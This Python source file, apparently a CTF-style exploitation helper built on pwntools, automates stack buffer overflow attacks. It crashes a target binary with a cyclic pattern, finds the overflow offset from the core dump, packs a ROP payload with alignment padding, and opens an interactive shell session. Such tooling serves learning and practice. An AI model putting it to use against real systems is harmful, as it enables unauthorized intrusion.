#!/usr/bin/env python3
##BEGIN#__________________________>#_|INFO|_#<________________________________##
##                                                           ______ _         ##
## DETAILS:                                                  | ___ (_)        ##
##- FILENAME		ak.py                                    | |_/ /___  __   ##
##- SCRIPT_ID		0x0000                                   |  __/| \ \/ /   ##
##- AUTHOR			Pixailz                                  | |   | |>  <    ##
##- CREATED			2023−06−12T06:26:26+0100                 \_|   |_/_/\_\   ##
##                                                                            ##
##END#____________________________<#_|INFO|_#>________________________________##

from pwn				import cyclic, cyclic_find, context
from os					import remove				as OS_REMOVE
from binascii			import unhexlify

from utils.parse		import parsed
from utils.bin			import Bin
from utils.rop			import Rop
from utils.cheaky_cheat	import CheakyCheat
from utils.log			import log, LM
from utils.conf			import CYCLIC_LEN
from utils.debug		import *

class Ak():
	def	__init__(self, path=None, libc=None):
		self.bin = Bin(
			path if path else parsed.target,
			libc if libc else parsed.libc
		)
		self.rop = Rop(self.bin)
		self.cheaky = CheakyCheat()
		self.payload = list()
		self.offset = None
		self.load_bin()
		if parsed.gdb:
			self.bin.pwn_load_local_gdb()

	def	exec_cheat(self, print_out=True):
		if self.bin.pro.poll() != None:
			self.load_bin()
		self.cheaky.exec_cheat()

	def	pack_payload(self):
		if self.offset != None:
			self.payload.insert(0, "A" * self.offset)
		self.p_payload = pack_all(self.bin.f_p, self.payload)
		if self.bin.arch == "amd64":
			if (len(self.p_payload) - self.offset) % 16 != 0:
				log.format("Not padded, movaps will cry, adding padding")
				self.payload.insert(1, self.rop.rop_items["ret"])
				self.p_payload = pack_all(self.bin.f_p, self.payload)

	def load_bin(self):
		if parsed.remote:
			self.bin.pwn_load_remote()
		else:
			self.bin.pwn_load_local()
		self.cheaky.set_process(self.bin.pro)

	def	go_interact(self, print_clean=True):
		if print_clean:
			splitted = self.bin.pro.clean().decode("utf-8").split('\n')
			log.format("cleaning program")
			log.stdout(0, *splitted)
		else:
			self.bin.pro.clean()

		self.bin.pro.interactive()

	def	get_core_dump(self):
		tmp_process = self.bin.lod.process()
		self.cheaky.set_process(tmp_process)
		self.cheaky.exec_cheat(False)
		tmp_process.sendline(cyclic(CYCLIC_LEN))
		tmp_process.wait_for_close()
		context.log_console = open('/dev/null', 'w')
		self.core_dp = tmp_process.corefile
		context.clear()
		self.cheaky.set_process(self.bin.pro)
		log.col_2("Removing core dump", self.core_dp.path)
		OS_REMOVE(self.core_dp.path)

	def	find_offset(self, reg=None):
		if reg == None:
			reg = self.bin.bp
		if self.bin.core_dp == None:
			self.get_core_dump()
		context.log_console = open('/dev/null', 'w')
		self.offset = cyclic_find(self.core_dp.registers[reg])
		context.clear()
		self.offset += len(addr_to_str(self.core_dp.registers[reg]))
		# report
		if self.offset == -1:
			log.format("offset not found.", LM.FAILURE)
		else:
			log.col_2("offset found", str(self.offset), LM.SUCCESS)

def	addr_to_str(addr):
	"""
	"""
	addr_str = str(hex(addr))
	return (addr_str)

def	pack_all(pack_func, items):
	"""
		pack items with pack_func, and join as byte
		pack_func could be either p64 or p32, depending on Bin.f_p
	"""
	packed = b""
	for item in items:
		if type(item) == str:
			packed += item.encode()
		elif type(item) == bytes:
			packed += item
		else:
			packed += pack_func(item)
	return(packed)
